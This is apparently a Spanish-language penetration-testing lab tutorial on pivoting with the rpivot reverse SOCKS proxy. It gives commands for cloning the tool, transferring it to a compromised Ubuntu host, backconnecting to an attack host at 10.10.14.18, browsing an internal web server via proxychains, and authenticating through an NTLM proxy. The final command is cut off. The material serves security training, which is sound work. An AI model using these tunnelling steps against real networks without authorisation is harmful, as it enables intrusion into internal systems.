[Rpivot](https://github.com/klsecservices/rpivot) es una herramienta de proxy SOCKS reverso escrita en Python para túneles SOCKS. Rpivot vincula una máquina dentro de una red corporativa a un servidor externo y expone el puerto local del cliente en el lado del servidor. Tomaremos el siguiente escenario, donde tenemos un servidor web en nuestra red interna (`172.16.5.135`), y queremos acceder a él usando el proxy de rpivot.

![](https://academy.hackthebox.com/storage/modules/158/77.png)

Podemos iniciar nuestro servidor de proxy SOCKS rpivot usando el siguiente comando para permitir que el cliente se conecte en el puerto 9999 y escuche en el puerto 9050 para conexiones de proxy pivot.

### Cloning rpivot

```r
sudo git clone https://github.com/klsecservices/rpivot.git
```

### Installing Python2.7

```r
sudo apt-get install python2.7
```

Podemos iniciar nuestro servidor de proxy SOCKS rpivot para conectarnos a nuestro cliente en el servidor Ubuntu comprometido usando `server.py`.

### Running server.py from the Attack Host

```r
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Antes de ejecutar `client.py`, necesitaremos transferir rpivot al objetivo. Podemos hacerlo usando este comando SCP:

### Transfering rpivot to the Target

```r
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Running client.py from Pivot Target

```r
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

### Confirming Connection is Established

```r
New connection from host 10.129.202.64, source port 35226
```

Configuraremos proxychains para pivotar sobre nuestro servidor local en 127.0.0.1:9050 en nuestro host de ataque, que fue inicialmente iniciado por el servidor Python.

Finalmente, deberíamos poder acceder al servidor web en nuestro lado del servidor, que está alojado en la red interna de 172.16.5.0/23 en 172.16.5.135:80 usando proxychains y Firefox.

### Browsing to the Target Webserver using Proxychains

```r
proxychains firefox-esr 172.16.5.135:80
```

![](https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

Similar al proxy pivot anterior, podría haber escenarios en los que no podamos pivotar directamente a un servidor externo (host de ataque) en la nube. Algunas organizaciones tienen [HTTP-proxy con autenticación NTLM](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configurado con el Domain Controller. En tales casos, podemos proporcionar una opción adicional de autenticación NTLM a rpivot para autenticarse a través del proxy NTLM proporcionando un nombre de usuario y contraseña. En estos casos, podríamos usar `client.py` de rpivot de la siguiente manera:

### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```r
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8
```